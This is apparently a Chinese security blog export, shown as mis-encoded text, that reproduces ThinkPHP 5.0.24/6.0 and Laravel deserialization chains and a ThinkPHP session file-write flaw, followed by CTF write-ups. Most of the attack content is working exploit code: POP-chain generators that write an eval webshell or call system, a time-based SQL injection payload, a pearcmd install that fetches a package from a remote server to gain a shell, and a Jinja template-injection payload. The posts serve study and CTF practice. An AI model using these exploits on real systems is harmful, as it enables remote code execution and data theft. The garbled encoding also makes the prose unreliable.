æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºåœ¨è¿™é‡Œä½¿ç”¨is_callableæ£€æµ‹å‡½æ•°æ˜¯å¦å¯è°ƒç”¨ï¼Œç„¶åç”¨ä¸æ–­ç”¨call_user_funcæ‰§è¡Œè¯¥å‡½æ•°ï¼ŒçŸ¥é“å°†ç”¨æˆ·è¾“å…¥çš„å˜é‡è¿‡æ»¤å®Œï¼Œè¿™æ—¶æˆ‘ä»¬çš„æ¶æ„ä»£ç system(â€˜whoamiâ€™)å°±æˆåŠŸè¢«æ‰§è¡Œï¼Œè¿™é‡Œè¿˜å¯ä»¥è°ƒç”¨ç³»ç»Ÿé™æ€æ–¹æ³•ä¸Šä¼ shellæ–‡ä»¶ï¼Œå…·ä½“çœ‹Nu1L easyTP5ã€‚ TP6.0session ä»»æ„æ–‡ä»¶åˆ›å»º&amp;åˆ é™¤æ¼æ´å¤ç°ç¯å¢ƒé…ç½®1composer create-project topthink/think tp 6.0.0 ä¸‹è½½å¥½åï¼Œå°†composer.jsonä¸­çš„æ•°æ®ä¿®æ”¹æˆå¦‚ä¸‹å›¾æ‰€ç¤º åœ¨app\\middleware.phpä¸­å¼€å¯sessionåŠŸèƒ½ å½±å“èŒƒå›´ThinkPHP 6.0.0~ThinkPHP 6.0.1 æ¼æ´å¤ç°æ¼æ´åˆ©ç”¨ç‚¹æ˜¯åœ¨sessionä¿å­˜æ—¶ï¼Œsessionæ–‡ä»¶åå¯æ§å¯¼è‡´çš„ä»»æ„æ–‡ä»¶åˆ›å»ºã€‚ åœ¨indexæ§åˆ¶å™¨å¼•å…¥Sessionç±»å¹¶æ·»åŠ å¦‚ä¸‹æµ‹è¯•æ–¹æ³•ã€‚ 1234use think\\facade\\Session; public function session_test()&#123; Session::set('id','name');&#125; è®¿é—®http://localhost/public/index.php/index/session_testï¼Œå¯ä»¥çœ‹è§åœ¨/runtime/sessionæ–‡ä»¶å¤¹ä¸‹æ ¹æ®sessionIDåˆ›å»ºäº†sessionæ–‡ä»¶ï¼Œå†…å®¹å°±æ˜¯å°†sessionä¸­çš„æ•°æ®åºåˆ—åŒ–ã€‚ ä¿®æ”¹sessionIDä¸ºï¼šaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php(é•¿åº¦ä¸º32ä½)ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸåœ¨\\runtime\\sessionæ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆäº†ä¸€ä¸ªphpæ–‡ä»¶ã€‚ å°è¯•ä¸€ä¸‹ç›®å½•ç©¿è¶Šï¼Œ/../../../public/aaaaaaaaaaa.phpæˆåŠŸå†™å…¥publicæ–‡ä»¶å¤¹ä¸­ã€‚ æ¼æ´åˆ†æå½“æ‰§è¡ŒSession::setæ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨\\vendor\\topthink\\framework\\src\\think\\session\\Store.phpä¸­çš„setIdæ–¹æ³• å½“ä¼ å…¥çš„SessionIdæ»¡è¶³32ä½é•¿åº¦æ—¶ï¼Œå°±å°†idè®¾ä¸ºSessionIdï¼Œå¦åˆ™å°±é‡è®¾SessionIdã€‚ ä¹‹åè¿›å…¥saveæ–¹æ³•ä¿å­˜ç”¨æˆ·sessionã€‚ 123456789101112public function save(): void&#123; $this-&gt;clearFlashData(); $sessionId = $this-&gt;getId(); if (!empty($this-&gt;data)) &#123; $data = $this-&gt;serialize($this-&gt;data); $this-&gt;handler-&gt;write($sessionId, $data); &#125; else &#123; $this-&gt;handler-&gt;delete($sessionId); &#125; $this-&gt;init = false;&#125; è·Ÿå…¥writeå‡½æ•°ã€‚ 1234protected function writeFile($path, $content): bool&#123; return (bool) file_put_contents($path, $content, LOCK_EX);&#125; å®ƒä½¿ç”¨file_put_contentså‡½æ•°å°†sessionIDä½œä¸ºæ–‡ä»¶åå†™å…¥æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ç›®å½•ç©¿è¶Šå®ç°ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œåˆ©ç”¨æ¡ä»¶æ˜¯ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶Sessionå†…å®¹ã€‚ åœ¨æ‰§è¡Œsaveæ–¹æ³•æ—¶ï¼Œå¯ä»¥çœ‹åˆ°å½“sessionå†…å®¹ä¸ºç©ºæ—¶ã€‚ä½¿ç”¨unlinkåˆ é™¤æ–‡ä»¶ï¼Œæ–‡ä»¶åæ§åˆ¶æ–¹æ³•ä¸ä¸Šé¢ä¸€æ ·ã€‚ TP5.0.24 ååºåˆ—åŒ–åˆ©ç”¨é“¾åˆ†æç¯å¢ƒæ­å»ºå°†composer.jsonä¿®æ”¹ä¸º5.0.24ç‰ˆæœ¬ï¼Œæ‰§è¡Œcomposer update åœ¨application/index/controllerä¸­åˆ›å»ºunserilizeæ–¹æ³• 123456public function unserilize()&#123; echo \"welcome\"; $input = input('get.input/s'); unserialize($input);&#125; æ¼æ´å¤ç°è·Ÿç€å¤§ä½¬åˆ†æäº†ä¸€ä¸‹é“¾å­https://www.anquanke.com/post/id/196364#h2-4ã€‚ exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpnamespace think\\process\\pipes;class Windows&#123; private $files = []; public function __construct()&#123; $this-&gt;files[0]=new \\think\\model\\Pivot(); &#125;&#125;namespace think\\model;use think\\Model;class Pivot &#123; protected $append = []; protected $updateWhere; protected $pk; public function __construct()&#123; $this-&gt;append[0]=\"getWhere\"; $this-&gt;pk=\"1\"; $this-&gt;updateWhere=new \\think\\model\\relation\\HasOne(); $this-&gt;parent=new \\think\\console\\Output(); &#125;&#125;namespace think\\model\\relation;class HasOne&#123; protected $query; protected $bindAttr = []; public function __construct()&#123; $this-&gt;query=new \\think\\db\\Query(); $this-&gt;bindAttr[0]=\"1\"; &#125;&#125;namespace think\\db;class Query&#123; protected $model; public function __construct()&#123; $this-&gt;model=new \\think\\console\\Output(); &#125;&#125;namespace think\\console;class Output&#123; protected $styles; private $handle; public function __construct()&#123; $this-&gt;styles=['getAttr']; $this-&gt;handle=new \\think\\session\\driver\\Memcache(); &#125;&#125;namespace think\\session\\driver;class Memcache&#123; protected $handler; public function __construct()&#123; $this-&gt;handler=new \\think\\cache\\driver\\File(); &#125;&#125;namespace think\\cache\\driver;class File&#123; protected $options; protected $tag; public function __construct()&#123; $this-&gt;options=['path'=&gt;'php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[\"nn\"]);?&gt;','data_compress' =&gt; false,'cache_subdir' =&gt; false,'prefix' =&gt; false,'expire' =&gt; 0,'prefix' =&gt; '']; $this-&gt;tag=1; &#125;&#125;$a=new \\think\\process\\pipes\\Windows();echo urlencode(serialize($a)); æ¼æ´åˆ†æè¿™æ¡é“¾å­æ˜¯åˆ©ç”¨php://filterç»•è¿‡æ­»äº¡exit;ï¼Œå†™å…¥shellï¼Œæ¥ä¸‹æ¥å…·ä½“åˆ†æä¸€ä¸‹æ•´ä¸ªé“¾å­å’Œè‡ªå·±çš„ä¸€äº›ä½“ä¼šï¼Œç”±äºè¿™æ˜¯æˆ‘å¤ç°çš„ç¬¬ä¸€æ¡ååºåˆ—åŒ–åˆ©ç”¨é“¾å­ï¼Œæ‰€ä»¥å†™çš„å¾ˆè¯¦ç»†ã€‚ é¦–å…ˆå…¨å±€æœç´¢ä¸€ä¸‹__destructæ–¹æ³•ï¼Œå‘ç°åœ¨\\think\\process\\pipes\\Windows.phpä¸­å­˜åœ¨ä¸€ä¸ªfile_existsèƒ½å¤Ÿè§¦å‘__tostring æ¥ç€å…¨å±€æœç´¢ä¸€ä¸‹__tostringï¼Œä¸€ä¸ªä¸€ä¸ªæ‰¾ï¼Œçœ‹æœ‰æ²¡æœ‰é…åˆå…¶ä»–é­”æœ¯æ–¹æ³•(æ¯”å¦‚__callä¹‹ç±»çš„)çš„ç‚¹ï¼Œå‘ç°åœ¨\\think\\Model.phpä¸­çš„__tostringæ–¹æ³•å­˜åœ¨ä¸€ä¸ªå¯ä»¥è°ƒç”¨__callï¼ˆPS:æ‰¾è¿™ç§__callé­”æœ¯æ–¹æ³•çš„æ—¶å€™éœ€è¦æ³¨æ„å‚æ•°ä¸€å®šæ˜¯è¦å¯æ§çš„ï¼‰çš„ç‚¹ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºModelç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä¸èƒ½è¢«ååºåˆ—åŒ–ï¼Œæ‰€ä»¥éœ€è¦æ‰¾ä¸€ä¸‹ä»–çš„å­ç±»æ¥è¿›è¡Œåˆ©ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨think\\model\\Pivotç±»ã€‚ æ³¨æ„çœ‹æˆ‘æ‰“æ–­ç‚¹çš„ä¸‰å¤„ï¼Œå¯ä»¥æ³¨æ„åˆ°ï¼Œä»£ç ä»$this-&gt;relationæ•°ç»„ä¸­å–åˆ°relationçš„å€¼ï¼Œç„¶åè°ƒç”¨$this-&gt;$relation()æ¥è·å–modelRelationçš„å€¼ï¼Œæ‰€ä»¥é¦–å…ˆæˆ‘ä»¬åœ¨è¯¥ç±»ä¸­æ‰¾åˆ°ä¸€ä¸ªè¿”å›å€¼å¯æ§çš„æ–¹æ³•ï¼Œæˆ‘æ‰¾äº†ä¸€ä¸ªgetwhereæ–¹æ³•ã€‚ å¯è§ï¼Œ$where=$this-&gt;updateWhereï¼ŒupdateWhereåˆšå¥½æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œä½†æ˜¯æƒ³è®©ä»–æˆåŠŸè¿”å›è¿˜éœ€è®¾ç½®$this-&gt;pkï¼Œå¦åˆ™$pkå–ä¸åˆ°å€¼ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œç»“æŸç¨‹åºã€‚æ§åˆ¶modelrelationçš„ä¸»è¦ç›®çš„è¿˜æ˜¯ä¸ºäº†æ§åˆ¶$valueï¼Œè·Ÿè¿›getRelationDataæ–¹æ³•ã€‚ é¦–å…ˆå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„modelRelationå¿…é¡»æ˜¯RelationæŠ½è±¡ç±»çš„å­ç±»ï¼Œè€Œä¸”åœ¨å‰é¢çœ‹åˆ°ï¼ŒmodelRelationä¹Ÿå¿…é¡»è¦å­˜åœ¨getBindAttræ–¹æ³•æ‰èƒ½åˆ°è¾¾æˆ‘ä»¬çš„åˆ©ç”¨ç‚¹ï¼Œå…¨å±€æœç´¢ä¸€ä¸‹ï¼Œå‘ç°åªæœ‰\\think\\model\\relation\\OneToOneç±»æ»¡è¶³è¿™ä¸ªè¦æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒOneToOneç±»ä»»ç„¶æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡å®ƒçš„å­ç±»æ¥åˆ©ç”¨ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯\\think\\model\\relation\\HasOneç±»ã€‚ è¯´å®Œäº†ModelRelationç±»çš„è¦æ±‚ï¼Œå›åˆ°è¿™ä¸ªifè¯­å¥ï¼Œç¬¬ä¸€ä¸ªæ¡ä»¶æ˜¯æˆ‘ä»¬çš„è¿”å›å€¼(å¯æ§)ï¼Œç¬¬äºŒä¸ªæ¡ä»¶å¯ä»¥ä½¿ç”¨$this-&gt;selfRelation=1æ¥é€šè¿‡åˆ¤æ–­ï¼Œç¬¬ä¸‰ä¸ªæ¡ä»¶è°ƒç”¨äº†getModelæ–¹æ³•ï¼Œè·Ÿå…¥è¯¥æ–¹æ³•ã€‚ è¿™é‡Œè°ƒç”¨äº†Queryç±»çš„getModelæ–¹æ³•ï¼Œè¿”å›å€¼æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥ç°åœ¨çš„é—®é¢˜æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„__callæ–¹æ³•ï¼Œè¿™ä¸ªæ”¾åœ¨æœ€åè¯´ï¼Œå›åˆ°ä¹‹å‰é‚£å¼ é•¿å›¾ã€‚ å¯ä»¥çœ‹åˆ°éœ€è¦æ§åˆ¶çš„è¿˜æœ‰$attrå˜é‡ï¼Œå®ƒé€šè¿‡getBindAttræ–¹æ³•æ¥è·å–ï¼Œä¹‹å‰è¯´è¿‡ï¼Œè¯¥æ–¹æ³•å­˜åœ¨äºOneToOneç±»ä¸­ã€‚ è¿™é‡Œç›´æ¥è¿”å›ä¸€ä¸ªå¯æ§å€¼ï¼Œæ‰€ä»¥ç°åœ¨æ–¹æ³•åå’Œå‚æ•°éƒ½å¯æ§ï¼Œå…¨å±€æœç´¢ä¸€ä¸‹__callæ–¹æ³•ï¼Œä¸€å…±å°±åå¤šä¸ªï¼Œç”±äºæˆ‘ä»¬ä¸èƒ½æ§åˆ¶æ–¹æ³•åï¼Œæ‰€ä»¥ç›®æ ‡ä¸»è¦æ”¾åœ¨è°ƒç”¨è‡ªèº«æ–¹æ³•çš„ç±»ä¸Šï¼Œä¸éš¾å‘ç°\\think\\console\\Outputç±»ä¸­çš„__callæ–¹æ³•å¯ä»¥åˆ©ç”¨ã€‚ è·Ÿå…¥blockæ–¹æ³•ï¼Œå®ƒæœ€ç»ˆè°ƒç”¨writeæ–¹æ³•ï¼Œè€Œ$this-&gt;handleå¯æ§ã€‚è¿™é‡Œçš„$messageå˜é‡å°±æ˜¯ç»è¿‡æ‹¼æ¥çš„$argsï¼Œä¸è¿‡è¯¥å˜é‡åœ¨åé¢æ²¡å•¥ä½œç”¨ï¼Œéšä¾¿è®¾ä¸€ä¸ªå€¼å³å¯ã€‚ é‚£ä¹ˆæˆ‘ä»¬ç»§ç»­æ‰¾å“ªä¸ªç±»ä¸­çš„writeæ–¹æ³•èƒ½è¢«åˆ©ç”¨ï¼Œæ‰¾äº†ä¸€åœˆï¼Œå‘ç°åœ¨\\think\\session\\driver\\Memcacheç±»çš„writeæ–¹æ³•ä¸­ä½¿ç”¨$this-&gt;handle-&gt;setè°ƒç”¨setæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­å¯»æ‰¾å¯åˆ©ç”¨çš„setæ–¹æ³•ã€‚ æœ€ç»ˆå‘ç°\\think\\cache\\driver\\Fileç±»ä¸­çš„setæ–¹æ³•å¯ä»¥å†™å…¥æ–‡ä»¶ã€‚ åŒæ ·æˆ‘ä¹Ÿåœ¨å…³é”®åœ°æ–¹æ‰“ä¸Šäº†æ–­ç‚¹ï¼Œé¦–å…ˆè·Ÿå…¥ç¬¬ä¸€ä¸ªæ–­ç‚¹ï¼Œå‘ç°filenameæ˜¯å¯æ§çš„ï¼Œå®ƒåé¢çš„æ‹¼æ¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpä¼ªåè®®æ¥ç»•è¿‡ã€‚ åœ¨è¿™é‡Œå¯ä»¥ä¼ å…¥ 1php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[&quot;nn&quot;]);?&gt; ç°åœ¨æˆ‘ä»¬åªæ˜¯èƒ½å¤Ÿæ§åˆ¶æ–‡ä»¶åï¼Œä½†æ˜¯æ–‡ä»¶çš„å†…å®¹æˆ‘ä»¬å´ä¸èƒ½æ§åˆ¶ï¼Œç»§ç»­è·Ÿå…¥setTagItemæ–¹æ³•ã€‚ å¯ä»¥å‘ç°ï¼Œfilenameä¼ å…¥ä¹‹åå˜æˆäº†value,å¹¶é‡æ–°è°ƒç”¨äº†ä¸€æ¬¡setæ–¹æ³•ï¼Œè¿™å°±æ„å‘³ç€ç°åœ¨æ–‡ä»¶åå’Œå‚æ•°éƒ½å¯æ§äº†ï¼Œé‚£ä¹ˆç¬¬äºŒæ¬¡çš„file_put_contentså°±å˜æˆäº† æˆåŠŸç»•è¿‡exitï¼Œå†™å…¥shellã€‚ åªä¸è¿‡è¿™ç§æ–¹æ³•ä¸èƒ½å†windowsä¸‹åˆ©ç”¨ï¼Œå› ä¸ºwindowsæ–‡ä»¶åä¸èƒ½å«æœ‰å°–æ‹¬å·ã€‚ TP6.0ååºåˆ—åŒ–åˆ©ç”¨é“¾åˆ†æç¯å¢ƒé…ç½®ç¯å¢ƒç”¨çš„æ˜¯TP6.0ï¼ŒåºŸè¯å°±ä¸å¤šè¯´å•¦ï¼Œæ€ä¹ˆé…å‰é¢éƒ½æœ‰äº†ï¼Œé¦–å…ˆåœ¨app\\controller\\index.phpä¸­åˆ›å»ºååºåˆ—åŒ–æ–¹æ³•ã€‚ 123456public function unserilize()&#123; echo &quot;welcome&quot;; $input = input(&apos;get.input/s&apos;); unserialize($input);&#125; æ¼æ´å¤ç°exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpnamespace think\\model\\concern&#123; trait Attribute&#123; private $data=[&quot;name&quot;=&gt;&quot;whoami&quot;]; protected $strict = true; private $withAttr = [&quot;name&quot;=&gt;&quot;system&quot;]; protected $schema = [&quot;name&quot;=&gt;&quot;11&quot;]; &#125;&#125;namespace think &#123; abstract class Model &#123; use model\\concern\\Attribute; private $lazySave; protected $withEvent ; private $exists; protected $name; public function __construct($a=&apos;&apos;) &#123; $this-&gt;lazySave = true; $this-&gt;withEvent=false; $this-&gt;exists=true; $this-&gt;name=$a; &#125; &#125;&#125;namespace think\\Model&#123; use think\\Model; class Pivot extends Model&#123; &#125;&#125;namespace &#123; use think\\Model\\Pivot; $a=new Pivot(new Pivot()); echo urlencode(serialize($a));&#125; æ¼æ´åˆ†æååºåˆ—åŒ–ä¸€èˆ¬éƒ½æ˜¯ä»¥__destrctæˆ–__wakeupæ–¹æ³•ä½œä¸ºï¼ŒTP6åˆ é™¤äº†windowsç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªæ–°çš„èµ·ç‚¹ã€‚ åœ¨vendor\\topthink\\think-orm\\src\\Model.phpä¸­çš„__destructæ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†saveå‡½æ•°ã€‚ è¿™é‡Œçš„Modelç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€ä»¥æ‰¾å…¨å±€ä¸€ä¸ªå­ç±»å³å¯ï¼Œè¿™é‡Œä½¿ç”¨Pivoitç±»ã€‚ è·Ÿå…¥updateDataæ–¹æ³•ï¼Œç¨‹åºåœ¨æ£€æŸ¥å®Œæ•°æ®åï¼Œè°ƒç”¨äº†db()æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œå­˜åœ¨å­—ç¬¦ä¸²æ‹¼æ¥$this-&gt;name.$this-&gt;suffixï¼Œè¿™ä¸¤ä¸ªå˜é‡æˆ‘ä»¬éƒ½å¯æ§ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥è§¦å‘__toStringï¼Œåœ¨src\\model\\concern\\Conversion.phpæ–‡ä»¶ä¸­ï¼Œå‘ç°äº†__toStringè°ƒç”¨äº†toJsonæ–¹æ³•ã€‚ ä»”ç»†çœ‹è¿™ä¸ªç±»å‘ç°æ˜¯traitç±»ï¼Œå¯ä»¥è¯´æ˜¯ç»§æ‰¿çš„æ‰©å±•ï¼Œå…è®¸ä¸€ä¸ªç±»ç»§æ‰¿(use)å¤šä¸ªtraitï¼ŒåŒæ ·ï¼Œå®ƒä¸èƒ½è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥åªèƒ½æ‰¾ä¸€ä¸ªå¼•ç”¨è¿‡å®ƒçš„ç±»ï¼Œæ°å·§ï¼Œæˆ‘ä»¬ä¹‹å‰ä½¿ç”¨çš„Modelç±»å°±å¼•ç”¨äº†trait Conversionã€‚ æ‰€ä»¥è¿™é‡Œèƒ½æ§åˆ¶$this-&gt;nameä¸ºæˆ‘ä»¬çš„Pivotç±»ï¼ˆæ³¨æ„ï¼šä¸è¦åœ¨__Constructæ–¹æ³•ä¸­ç›´æ¥èµ‹å€¼ï¼Œå¥—å¨ƒè­¦å‘Šï¼ï¼‰ã€‚ ç»§ç»­è·Ÿè¿›ï¼ŒtoJson-&gt;toArray-&gt;getAttr-&gt;getValue å‘ç°è¿™é‡Œä½¿ç”¨äº†å¯å˜å‡½æ•°ï¼Œä½†æ˜¯å…·æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œåˆšå¥½systemå‡½æ•°æ˜¯å…è®¸è¿™ç§æ ¼å¼çš„è¾“å…¥çš„ã€‚ æ‰€ä»¥å¯ä»¥æ§åˆ¶closureä¸ºsystemï¼Œvalueä¸ºæˆ‘ä»¬æƒ³æ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿™é‡Œclosureçš„å€¼å°±æ˜¯åœ¨$this-&gt;withAttræ•°ç»„ä¸­å–å‡ºï¼Œè€Œfieldnameçš„å€¼å¯ä»¥æ§åˆ¶ä¸ºä¼ å…¥çš„nameå‚æ•°ï¼Œå…ˆçœ‹valueå¾—å€¼ã€‚ å¯ä»¥çœ‹åˆ°$valueçš„å€¼è¢«ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ï¼Œæ‰€ä»¥å›åˆ°getattræ–¹æ³•ï¼Œå‘ç°valueçš„å€¼æ˜¯ä»$this-&gt;dataæ•°ç»„ä¸­å–å‡ºæ¥çš„ï¼Œå…³é”®æ˜¯nameå‚æ•°ã€‚ ç»§ç»­å›é€€ï¼Œnameå°±æ˜¯ä»$this-&gt;dataä¸­å–å‡ºæ¥çš„é”®å€¼ã€‚ è¿™é‡Œçš„$keyå°±æ˜¯ä½œä¸ºnameå‚æ•°ä¼ å…¥çš„ï¼Œæ‰€ä»¥æ§åˆ¶$withAttr[&#39;name&#39;]=systemï¼Œå†ä¼ å…¥$data[&#39;name&#39;]=whoamiå³å¯æˆåŠŸæ§åˆ¶$clouserå’Œ$valueï¼ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œã€‚ Lavarelé“¾å­ï¼ˆæ··å…¥å¥‡æ€ªçš„ä¸œè¥¿ç¯å¢ƒé…ç½®1composer create-project --prefer-dist laravel/laravel laravel58 æ¼æ´å¤ç°åˆ†æäº†è¿™ä¹ˆå¤šååºåˆ—åŒ–é“¾ï¼Œè¯´çš„ä¹Ÿå·®ä¸å¤šäº†ï¼Œå°±ä¸åˆ†æäº†(æ‡’ç‹—ï¼Œä¸‹é¢ä¸å¸¦åˆ†æäº†ï¼Œlavarelé“¾å­æ¯”è¾ƒç®€å•ã€‚ ç‰ˆæœ¬5.8.261234567891011121314151617181920212223242526&lt;?phpnamespace Symfony\\Component\\Cache\\Adapter;class TagAwareAdapter&#123; private $deferred; private $pool; public function __Construct()&#123; $this-&gt;deferred[\"0\"]=\"cat /flag\"; $this-&gt;pool=new \\Faker\\Generator(); &#125;&#125;namespace Faker;class Generator&#123; protected $formatters = array(); public function __Construct()&#123; $this-&gt;formatters[\"saveDeferred\"]=\"system\"; &#125;&#125;$a=new \\Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter();echo urlencode(serialize($a)); ç‰ˆæœ¬7.29.31234567891011121314151617181920&lt;?phpnamespace Illuminate\\Broadcasting;class PendingBroadcast&#123; public $events; public $event; public function __Construct()&#123; $this-&gt;event=47; $this-&gt;events=new \\Faker\\Generator(); &#125;&#125;namespace Faker;class Generator&#123; protected $formatters = []; public function __Construct()&#123; $this-&gt;formatters[\"dispatch\"]=\"phpinfo\"; &#125;&#125;$a=new \\Illuminate\\Broadcasting\\PendingBroadcast();echo urlencode(serialize($a));","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://yoursite.com/categories/æ¼æ´å¤ç°/"}],"tags":[]},{"title":"æå®¢å·…å³°+æœˆé¥¼èµ›","slug":"æå®¢å·…å³°","date":"2020-09-26T16:00:00.000Z","updated":"2020-09-28T08:05:42.807Z","comments":true,"path":"2020/09/27/æå®¢å·…å³°/","link":"","permalink":"http://yoursite.com/2020/09/27/æå®¢å·…å³°/","excerpt":"","text":"BABYPHP2www.zipæºç æ³„éœ²ï¼Œå®¡æŸ¥æºç å‘ç°æ–‡ä»¶ä¸Šä¼ å’Œè¯»å–ï¼Œå¯ä»¥æ„é€ pharååºåˆ—åŒ–ã€‚ é“¾å­è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚ 123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass User&#123; public $nickname=null; public $backup; public function __construct()&#123; $this-&gt;nickname=new Reader(); $this-&gt;backup=\"/flag\"; &#125; public function __toString() &#123; $this-&gt;nickname-&gt;backup=$this-&gt;backup; $user = new User(); $user-&gt;id = $_SESSION['id']; $user-&gt;nickname = $_SESSION['token']; return serialize($user); &#125;&#125;class dbCtrl&#123; public $token; public function __construct() &#123; $this-&gt;token=new User(); &#125;&#125;Class Reader&#123;&#125;$a=new dbCtrl();$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ç”¨ä»¥æ¬ºéª—æ£€æµ‹$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶$phar-&gt;stopBuffering(); ä½¿ç”¨compress.zlib://phar:// ç»•è¿‡WAFï¼Œè¯»å–flagã€‚ babybackè¿‡æ»¤äº†å•å¼•å·ï¼Œä½¿åæ–œæ ç»•è¿‡ï¼Œsleepç›²æ³¨è·å¾—adminå¯†ç ç™»å½•åå°ã€‚ 1username=\\&amp;password=or if((ascii(substr((password),1,1))&lt;120),sleep(2),1)# åå°æ˜¯ä¸€ä¸ªeval($cmd.â€™=FALSEâ€™)å‘½ä»¤æ‰§è¡Œ 1payload=?&gt;&lt;?=require%0a~%D0%99%93%9E%98?%3E meow worldæ ¹æ®æç¤º ï¼Œæœåˆ°äº†ä¸€ç¯‡æ–‡ç« CAMPCTFï¼Œå¹¶ä¸”æ‰¾åˆ°äº†pearcmd.phpï¼Œè¯»å–æºç  ï¼Œå‘ç°é€šè¿‡argvå‚æ•°å¯ä»¥getshellã€‚ ç”±äºå¯åŠ¨äº†register_argc_argv ï¼Œargvå¯ä»¥ç›´æ¥é€šè¿‡GETä¼ å‚è·å–ï¼Œä½¿ç”¨+å¯ä»¥åˆ†éš”æ•°ç»„ã€‚ 1payload=/?f=pearcmd&amp;argv=1+list æ­¤å‘½ä»¤åˆ—å‡ºäº†å·²å®‰è£…çš„pearè½¯ä»¶åŒ…ã€‚ æ ¹æ®æ–‡ç« ä¸­æ‰€è¿°ï¼Œå¯ä»¥é€šè¿‡install pearå®‰è£…åŒ…ä¸Šä¼ shellï¼ŒæŒ‰ç…§æ–‡ç« ä¸­æ‰“åŒ…å¥½å®‰è£…åŒ…ï¼Œå¹¶æ”¾åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸‹ã€‚ 1payload=/?f=pearcmd&amp;argv=list+install+--installroot+/tmp/+http://ip+port/upload.tar.gz æˆåŠŸå®‰è£…ï¼Œå®‰è£…åçš„è·¯å¾„æ˜¯ç”±/tmp+pearcmd.phpæ‰€åœ¨è·¯å¾„+doc+å®‰è£…åŒ…å†…è·¯å¾„ç»„æˆï¼Œé€šè¿‡æŠ¥é”™è·å¾—pearcmd.phpæ‰€åœ¨è·¯å¾„ä¸ºï¼š 1/usr/local/lib/php 1payload=/?f=/tmp/usr/local/lib/php/doc/Archive_Tar/Archive/eval æˆåŠŸgetshell,ä½¿ç”¨èšå‰‘è¿æ¥åå°ï¼Œè¿˜éœ€è¦å†™ä¸€ä¸ªè®¡ç®—é¢˜ã€‚ 1234567891011121314151617use strict;use IPC::Open3;my $pid = open3( \\*CHLD_IN, \\*CHLD_OUT, \\*CHLD_ERR, '/readflag' ) or die \"open3() failed $!\";my $r;$r = &lt;CHLD_OUT&gt;;print \"$r\";$r =substr($r,0,11);$r = eval \"$r\";print \"$r\\n\";print CHLD_IN \"$r\\n\";$r = &lt;CHLD_OUT&gt;;print \"$r\";$r = &lt;CHLD_OUT&gt;;print \"$r\"; æˆåŠŸè¯»å–flagã€‚ babyflaskä¸€æŠŠæ¢­ 1234567&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if 'eval' in b.keys() %&#125; &#123;&#123; b['eval']('__import__(\"os\").popen(\"cat /flag\").read()') &#125;&#125; &#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; æœˆé¥¼èµ›web2_æ•…äººå¿ƒç¬¬ä¸€å…³ç§‘å­¦è®¡æ•°æ³•é€ æˆæµ®ç‚¹æ•°æº¢å‡ºpayload=1e-199ã€‚ ç¬¬äºŒå…³md2 0eå¼±æ¯”è¾ƒ å•æ¬¡md2åŠ å¯†ï¼š0e652024452 ä¸¤æ¬¡md2åŠ å¯†ï¼š0e603448399 ç¬¬ä¸‰å…³ï¼šè¦æ±‚hostå¿…é¡»å«æœ‰ctfshow.com,ä½¿ç”¨æ–‡ä»¶å¤¹è·¯å¾„ç»•è¿‡ï¼ša://ctfshow.com/../../../../../fl0g.txt 